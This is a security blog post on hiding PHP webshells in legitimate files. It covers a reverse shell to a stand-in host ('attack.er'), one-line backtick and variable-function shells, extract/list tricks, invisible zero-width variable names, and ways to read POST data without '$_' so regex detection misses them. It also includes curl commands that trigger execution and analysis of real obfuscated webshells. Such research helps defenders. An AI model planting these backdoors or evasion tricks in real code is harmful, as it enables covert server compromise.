---
layout: posts
title:  Hidden in plain sight
date:   2023-10-31
categories: stuff
---

_A few thoughts about PHP webshells ..._

Do you think such a piece of code could be harmful ?

```php
list($x, $x‍) = $_POST;
$x($x‍);
```

If no, please continue reading ...

# Intro

Although it is fun to find tricky client-side injections, path traversals or IDORs in web applications, it is generally much more satisfying to gain arbitrary code execution (or even better, a command execution). Therefore, arbitrary code execution (or generally referred to as RCE - Remote Code Execution) is not a vulnerability _per se_, but is the attack resulting from an exploited vulnerability (or a chain of vulnerabilities). Multiple vulnerabilities are known to potentially be the root cause of an RCE, such as (and not limited to):
* Local File Inclusion, for which an attacker includes a data stream so as to evaluate it ;
* SQL injection, if the DBMS capabilities allow it, and if the abused service account is privileged enough (local file writes, `xp_cmd_shell`, `COPY ... FROM PROGRAM`, etc.) ;
* Unrestricted File Upload / Arbitrary File Write, for which an attacker can drop their own scripts on the server, and is able to make the latter execute them ;
* Unsafe Deserialisation, for which an attacker creates arbitrary objects, and possibly calls arbitrary routines ;
* Commands Injection, for which an attacker includes their own commands into a legitimate one ;

However, gaining an arbitrary code execution is not always an immediate _game over_, because:
* Turning the code execution into command execution might be sometimes tricky ;
* The attacker generally wants to be the only one controlling the target, and wants to prevent the server from being compromised by someone else ;
* An antimalware solution might be triggered by obvious payloads, that could also warn the webmaster ;
* This same webmaster, while doing their daily routine, might be triggered by unexpected artefacts (e.g. files, logs) ;
* Ensuring persistence is also a commonly pursued goal, saving the need of a future re-exploitation ;

Being stealth and efficient at the same time might be challenging. As a first common approach, attackers could leave powerful webshells somewhere on the disk, at an unexpected location where it is unlikely that a webmaster finds them. A second common solution would be to open a reverse shell, if possible, with something like:

```php
$sock = fsockopen("attack.er",1234);
$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
```

If the host and port are hardcoded, it might only appear as a hanging blank page to those who find it unintentionally, and cannot be abused by other attackers. Finally, a third common approach would be to drop only a minimalist webshell such as

```
<?=`$_GET[0]`;?>
```

The payload can be written in its own file, or hidden somewhere in a legitimate one, where it is more difficult to find.

# Obfuscation or minimalism ?

In the first case, powerful webshells are often heavily obfuscated. Taking a look at the malware should quickly raise suspicion with weird symbols, _dirty_ code, escaped strings, etc. To let the compromised web site work properly, it is common for such webshells to be either put in their own files, or prepended or appended to legitimate ones. For instance, let's take a look at this webshell I found on a compromised WordPress site:

<img width="100%" style="margin-left:auto;margin-right:auto;display:block;" alt="webshell_obf" src="/assets/res/stuff/webshell_obf.png">

The principle of this one is quite simple: the file reads itself and looks for the marker `?>`, indicating the end of the PHP code (the encoded text starting with `=0UV...`, in this case). The data after the marker is then saved as `$L66Rgr[1]` and its decoded version as `L6CRgr[2]`. Then `preg_replace` is used as a pretext to execute `eval` on the latter.

Some other webshells also put an encrypted payload in an external text file, and use poor crypto to recover and evaluate it. Not shown here to keep it simple, but the class `UnsafeCrypto` only uses `openssl_*` functions to decrypt/encrypt with `aes-256-ctr` and hardcoded parameters.

<img width="75%" style="margin-left:auto;margin-right:auto;display:block;" alt="webshell_enc" src="/assets/res/stuff/webshell_enc.png">

Finally, let's take this other webshell, coming as a backdoored `index.php` file:

<img width="100%" style="margin-left:auto;margin-right:auto;display:block;" alt="backdoored_index" src="/assets/res/stuff/backdoored_index.png">

No doubt that the second line has nothing to do there, and that someone who knows a little bit of PHP and security would find it suspicious. Although it would take time to fully understand what this webshell does (assuming that it is unknown), the malicious intent is quite obvious. To make it stealthier, an attacker could prefer another approach: injecting something like ``` `$_GET[0]`; ``` somewhere in a legitimate PHP file (note the backticks). This code executes GET arguments as a bash command, because of the backtick operators, acting like a call to `shell_exec`. Such a tiny line would not raise much suspicion if lost in the legitimate code.

One could identify three main strategies for such tiny payloads:
* Having a webshell that calls an `exec`-like functions (`system`, `passthru`, `shell_exec` or the backtick operator, `proc_open`, `popen`, `pcntl_exec`), passing as argument a user-supplied input (e.g. `<?php system($_GET[0]); ?>`). Indeed, what an attacker generally wants is to execute bash commands ;
* Having a webshell that calls `eval`-like functions, knowing that alternatives are made more difficult to exploit with PHP 8. This second solution makes the webshell even more versatile, but the drawback is that `eval` cannot be used as a variable function. Whereas it is possible to call `system` with something like `('sys'.'tem')/**/('id');`, doing so with `eval` would not work ([source: Variable functions](https://www.php.net/manual/en/functions.variable-functions.php)) ;
* Having a webshell for which function names are dynamically resolved with variable functions, such as `<?php $_GET['a']($_GET['b']); ?>`. This third solution is an in between since it does not hardcode the routine name, while still being a bit more restrictive than an `eval`.

# The `extract` routine

An uncommon way to apply the third solution is to use the routine `extract` ([documentation](https://www.php.net/manual/en/function.extract)). According to the documentation:

>
>extract — Import variables into the current symbol table from an array  
>...  
>Do not use extract() on untrusted data, like user input (e.g. $_GET, $_FILES).  
>

In other words, such a piece of code:

```php
extract(array("a" => "b", "c" => "d"));
```

would create the variable `$a = "b"` and `$c = "d"`. Combining it with variable functions, it is now clear that `$_GET['a']($_GET['b']);` could be written as:

```php
extract($_GET);
$a($b);
```

In other words, using `extract` in this way is like setting `register_globals` to `on`.

_The routine `parse_str` could have the same effect if it is used with only one argument. But as of PHP 8.0.0, the second parameter is mandatory._

# The `list` routine

Another interesting routine similar to `extract` is [`list`](https://www.php.net/manual/en/function.list.php). As stated in the doc:

>
>Like array(), this is not really a function, but a language construct. list() is used to assign a list of variables in one operation. Strings cannot be unpacked and list() expressions cannot be completely empty.
>

Compared to `extract`, the documentation does not warn here against misuses. My guess is that a misuse of `extract` would involve the passed parameter (a user-controlled array), while a misuse of `list` would involve the right side of the assignment, and therefore not something directly related to the routine itself. For example, the following snippet would create the variables `$drink`, `$color` and `$power`, respectively assigning to them the values _coffee_, _brown_, and _caffeine_ (from the doc). 

```php
$info = array('coffee', 'brown', 'caffeine');
list($drink, $color, $power) = $info;
```

To make it behave like `extract`, one would need to write something like:

```php
list($a,$b) = $_POST;
$a($b);
```

To trigger the code execution, one would then need to send something like:

<img width="100%" style="margin-left:auto;margin-right:auto;display:block;" alt="webshell_list" src="/assets/res/stuff/webshell_list.png">


By default, index names are increasing integers. The `extract` solution has the advantage that no obvious relation exists between the `$_POST` and the variables `$a` and `$b`; 

# Weird PHP variables

Does this tiny PHP file seem harmful ?

```php
list($x, $x‍) = $_POST;
$x($x‍);
```

_These two lines of PHP code could be put somewhere in a legitimate file (maybe not as sequential instructions)._

Of course, the second line extracts untrusted data and creates variables from it, and uses it to call variable functions. However, it seems that it can only be something like `'system'('system')` or `'exec'('exec')`, with the argument value being the same as the function name, and such instructions should not be useful. Is it, really ?

However, running an `xxd` on the file reveals that the second `$x` is actually not the same as the first one. The variable name also contains the _U+200D ZERO WIDTH JOINER_ character (`\xE2\x80\x8D`). 

<img width="50%" style="margin-left:auto;margin-right:auto;display:block;" alt="weird_shell2" src="/assets/res/stuff/weird_shell2.png">

Some odd non-printable characters are appended to its name. According to the PHP documentation, variable names are valid as long as they follow this regular expression:

```
^[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff]*$
```

which means that letters (uppercase and lowercase), numbers, underscores and binary characters can be used (the first one cannot be a number). Some of these non-printable characters can be invisible ([invisible-characters.com](https://invisible-characters.com/)), making `$x` variables visually (almost) the same. To trigger code execution, the same payload can be used:

```bash
$ curl -k http://targ.et/test.php -d '0=system' -d '1=uname -a'
```

However, if the version with `extract` is used:

```php
extract($_POST);
$x($x‍);
```

named indexes must be used for the two `$x` variables (a real one and a look-alike), and the `curl` command would be something like:

<img width="100%" style="margin-left:auto;margin-right:auto;display:block;" alt="weird_shell3" src="/assets/res/stuff/weird_shell3.png">

# Getting rid of `$_`

The common way to pass data to PHP scripts is to send them as GET or POST parameters. Passing them as custom HTTP headers is also something quite common, to avoid payloads being logged. On the server side, passed parameters are generally retrieved with superglobals `$_GET` or `$_POST`, as shown in the tiny webshells with `list` and `extract`. The following superglobals are under the user's control, totally or partially:
* `$_GET`: the parameters passed by the user in the URL ;
* `$_POST`: the parameters passed by the user in the request body ;
* `$_FILES`: uploaded files, populated even if no uploaded file is expected ;
* `$_COOKIE`: submitted cookies ;
* `$_SESSION`: normally not completely under the user's control (fortunately). It contains data related to the current user's session ;
* `$_REQUEST`: merges `$_GET`, `$_POST` and `$_COOKIE` ;
* `$_ENV`: associative array that contains variables passed to the current script via the environment method. It is not completely under the user's control, but they can still manipulate some entries, such as `$_ENV['REQUEST_URI']` ;
* `$GLOBALS`: variables populated based on current user's session and HTTP request being sent. It contains the variables `_GET` or `_POST` ;
* `$_SERVER`: similar to `$_ENV`, and it also contains some entries under the user's control.

Although using superglobals is quite handy, spotting patterns like `extract($_POST)` or `list(...) = $_POST` can be done with a few regular expressions, hunting for `$_` or `$GLOBALS`. However, PHP is a permissive language, making it possible to recreate variables based on string manipulations, with [variable variables](https://www.php.net/manual/en/language.variables.variable.php):

```php
$x = '_'.'POST';
echo $$x['param'];
```

The double-dollar sign would recreate the variable named `_POST`, giving in the end `$_POST["param"]`.

_**Warning** Please note that variable variables cannot be used with PHP's Superglobal arrays within functions or class methods. The variable $this is also a special variable that cannot be referenced dynamically. That's what the doc says._

Another way to write it could be as follows:

```php
$x = ${"_"."POST"}["param"];
```

However, we can do a bit better, by getting rid of the `$` sign. This is great because the constructions `$$` and `${` are a bit odd and can be spotted with regular expressions (note that the symbols can be separated by dummy comments like `$/*useless*/$x`).

The following lines can also be used to retrieve data sent as POST parameters:

```php
echo filter_input(0, "param");
echo file_get_contents("php://input");
echo get_defined_vars()[array_keys(get_defined_vars())[1]]["param"];
```

Let's get more into details.

## The routine `filter_input`

As stated in the doc

>```
>filter_input — Gets a specific external variable by name and optionally filters it
>
>filter_input(
>    int $type,
>    string $var_name,
>    int $filter = FILTER_DEFAULT,
>    array|int $options = 0
>): mixed
>```


The first argument (`$type`) is supposed to be one of **INPUT_GET**, **INPUT_POST**, **INPUT_COOKIE**, **INPUT_SERVER**, or **INPUT_ENV**. These values can, however, be translated into integers:

* INPUT_GET: 1 ;
* INPUT_POST: 0 ;
* INPUT_COOKIE: 2 ;
* INPUT_SERVER: 5 ;
* INPUT_ENV: 4 ;

_The 3 does not seem to be defined._

The second argument is the same as the passed parameter, which means that `filter_input(0, "param");` would extract the value of the parameter `param` sent through POST.

## The routine `file_get_contents`

This routine can be used to read a data stream (e.g. file, URL), and is quite well known. The wrapper `php://input` is _a read-only stream that allows you to read raw data from the request body_ ([source](https://www.php.net/manual/en/wrappers.php.php)). Using it as an argument for `file_get_contents` is therefore an easy way to store the POST'ed data in a variable:

```php
$x = file_get_contents("php://input");
var_dump($x);
```

If the POST'ed data contains _a=b&c=d_, this snippet of code would print:
```
string(7) "a=b&c=d"
```

Some manipulations still need to be done to separate the parameters.

## The routine `get_defined_vars`

As stated in the holy doc:

>
>This function returns a multidimensional array containing a list of all defined variables, be them environment, server or user-defined variables, within the scope that get_defined_vars() is called.
>

_I know there is a typo and that "be them environment" is wrong, but that is what is written._

Even if no POST or GET parameter is sent, the returned multidimensional array would not be empty:

```
Array
(
    [_GET] => Array
        (
        )

    [_POST] => Array
        (
        )

    [_COOKIE] => Array
        (
        )

    [_FILES] => Array
        (
        )

)
```

Therefore, having such a request `curl -k https://targ.et/test.php?x=qwertz -d 'y=asdf'` would give something like:

```
Array
(
    [_GET] => Array
        (
            [x] => qwertz
        )

    [_POST] => Array
        (
            [y] => asdf
        )

    [_COOKIE] => Array
        (
        )

    [_FILES] => Array
        (
        )

)
```

To access each item without the string `_GET` or `_POST`, one could use the routine `array_keys`, which returns the list of the keys:

```php
print_r(array_keys(get_defined_vars()));
```

The result would be like:
```
Array
(
    [0] => _GET
    [1] => _POST
    [2] => _COOKIE
    [3] => _FILES
)
```

Therefore, retrieving the POST'ed data could be done as follows:

```php
get_defined_vars()[array_keys(get_defined_vars())[1]]; //all POST'ed data
get_defined_vars()[array_keys(get_defined_vars())[1]]["param"]; //the parameter 'param'
```

Let's wrap it up in a single PHP script:

<img width="100%" style="margin-left:auto;margin-right:auto;display:block;" alt="post_without_dollar" src="/assets/res/stuff/post_without_dollar.png">

In the previous snippet, we use an additional evasion technique, masquerading `exec` as `trim`. Although the function already exists ([source](https://www.php.net/manual/en/function.trim)), it can be replaced in the current script.

Let's trigger the command execution with `curl`:

<img width="100%" style="margin-left:auto;margin-right:auto;display:block;" alt="post_without_dollar_exec" src="/assets/res/stuff/post_without_dollar_exec.png">

_Not optimal because of multiline output_

The five commands passed as _A_, _B_, _C_, _D_ and at the beginning of the POST'ed data are indeed passed to the `exec` routine, and successfully lead to commands execution. 

# Sources:
* [PHP Backdoors: Hidden With Clever Use of Extract Function](https://blog.sucuri.net/2014/02/php-backdoors-hidden-with-clever-use-of-extract-function.html)